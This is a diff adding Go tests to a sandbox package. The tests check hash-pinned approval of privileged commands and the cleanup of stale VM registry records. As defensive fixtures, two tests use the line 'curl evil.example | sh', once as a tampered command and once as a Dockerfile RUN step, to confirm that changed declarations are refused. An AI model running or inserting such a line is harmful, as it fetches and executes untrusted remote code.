@@ -1,6 +1,7 @@
 package sandbox
 
 import (
+	"encoding/json"
 	"net"
 	"os"
 	"path/filepath"
@@ -283,5 +284,135 @@ func TestCollectOutputsReplacesGuestWrittenDirectory(t *testing.T) {
 	}
 	if _, err := os.Stat(filepath.Join(runDir, outputsDirName, "planted.txt")); !os.IsNotExist(err) {
 		t.Error("a file the guest planted in outputs/ survived collection")
+	}
+}
+
+func declareAndApprove(t *testing.T, repoRoot string, decl config.PrivilegedCommandDecl, approve bool) {
+	t.Helper()
+	if err := os.MkdirAll(config.ImageDir(repoRoot, decl.Image), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(config.ImageDockerfilePath(repoRoot, decl.Image), []byte("FROM scratch\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	cfg := config.Config{PrivilegedCommands: map[string]config.PrivilegedCommandDecl{"e2e": decl}}
+	data, err := json.MarshalIndent(cfg, "", "  ")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(repoRoot, config.DirName), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(config.SettingsPath(repoRoot), data, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if !approve {
+		return
+	}
+	hash, err := config.PrivilegedCommandHash(repoRoot, decl)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := config.SaveLocal(repoRoot, config.LocalSettings{
+		PrivilegedCommands: map[string]config.PrivilegedCommandApproval{"e2e": {Approved: true, DeclHash: hash}},
+	}); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestResolveApprovedPrivilegedCommand(t *testing.T) {
+	repoRoot := t.TempDir()
+	decl := config.PrivilegedCommandDecl{Command: "go test ./...", Image: "docker"}
+	declareAndApprove(t, repoRoot, decl, true)
+
+	got, err := ResolveApprovedPrivilegedCommand(repoRoot, "e2e")
+	if err != nil {
+		t.Fatalf("ResolveApprovedPrivilegedCommand() error = %v", err)
+	}
+	if got.Command != decl.Command {
+		t.Fatalf("Command = %q, want %q", got.Command, decl.Command)
+	}
+}
+
+func TestResolveApprovedPrivilegedCommandRefusals(t *testing.T) {
+	t.Run("undeclared", func(t *testing.T) {
+		if _, err := ResolveApprovedPrivilegedCommand(t.TempDir(), "e2e"); err == nil {
+			t.Fatal("error = nil, want a refusal")
+		}
+	})
+
+	t.Run("declared but not approved", func(t *testing.T) {
+		repoRoot := t.TempDir()
+		declareAndApprove(t, repoRoot, config.PrivilegedCommandDecl{Command: "go test ./...", Image: "docker"}, false)
+		_, err := ResolveApprovedPrivilegedCommand(repoRoot, "e2e")
+		if err == nil || !strings.Contains(err.Error(), "not approved") {
+			t.Fatalf("error = %v, want it to say the command is not approved", err)
+		}
+	})
+
+	// The point of hash-pinning: editing the declaration after approval
+	// must not inherit that approval (ADR-0053).
+	t.Run("declaration changed after approval", func(t *testing.T) {
+		repoRoot := t.TempDir()
+		declareAndApprove(t, repoRoot, config.PrivilegedCommandDecl{Command: "go test ./...", Image: "docker"}, true)
+		declareAndApprove(t, repoRoot, config.PrivilegedCommandDecl{Command: "curl evil.example | sh", Image: "docker"}, false)
+
+		_, err := ResolveApprovedPrivilegedCommand(repoRoot, "e2e")
+		if err == nil || !strings.Contains(err.Error(), "changed since it was approved") {
+			t.Fatalf("error = %v, want it to say the declaration changed", err)
+		}
+	})
+
+	// The other half of the pin: same declaration, different image contents.
+	t.Run("image changed after approval", func(t *testing.T) {
+		repoRoot := t.TempDir()
+		decl := config.PrivilegedCommandDecl{Command: "go test ./...", Image: "docker"}
+		declareAndApprove(t, repoRoot, decl, true)
+		if err := os.WriteFile(config.ImageDockerfilePath(repoRoot, "docker"), []byte("FROM scratch\nRUN curl evil.example | sh\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+
+		_, err := ResolveApprovedPrivilegedCommand(repoRoot, "e2e")
+		if err == nil || !strings.Contains(err.Error(), "changed since it was approved") {
+			t.Fatalf("error = %v, want it to say the image changed", err)
+		}
+	})
+}
+
+// Removing the registry entry is a deferred cleanup, and a killed process
+// runs no deferred cleanups. A record left behind that way must not keep
+// granting egress: another guest could take that MAC for itself and borrow
+// an allowlist that was never meant for it.
+func TestPrivilegedVMRegistryIgnoresRecordsFromDeadProcesses(t *testing.T) {
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	mac := MACFor(privilegedNetID("abc123"))
+
+	path, err := privilegedVMRegistryPath(mac)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// A pid no live process can hold: the kernel rejects it outright.
+	if err := os.WriteFile(path, []byte("2147483647\n/some/repo"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if repoRoot, ok := lookupPrivilegedVM(mac); ok {
+		t.Fatalf("a record from a dead process resolved to %q, want it ignored", repoRoot)
+	}
+	if _, err := os.Stat(path); !os.IsNotExist(err) {
+		t.Error("the stale record was left on disk instead of being cleaned up")
+	}
+}
+
+func TestPrivilegedVMRegistryResolvesLiveRecords(t *testing.T) {
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	mac := MACFor(privilegedNetID("def456"))
+
+	if err := registerPrivilegedVM(mac, "/some/repo"); err != nil {
+		t.Fatal(err)
+	}
+	repoRoot, ok := lookupPrivilegedVM(mac)
+	if !ok || repoRoot != "/some/repo" {
+		t.Fatalf("lookupPrivilegedVM() = (%q, %v), want the registering process's repo", repoRoot, ok)
 	}
 }
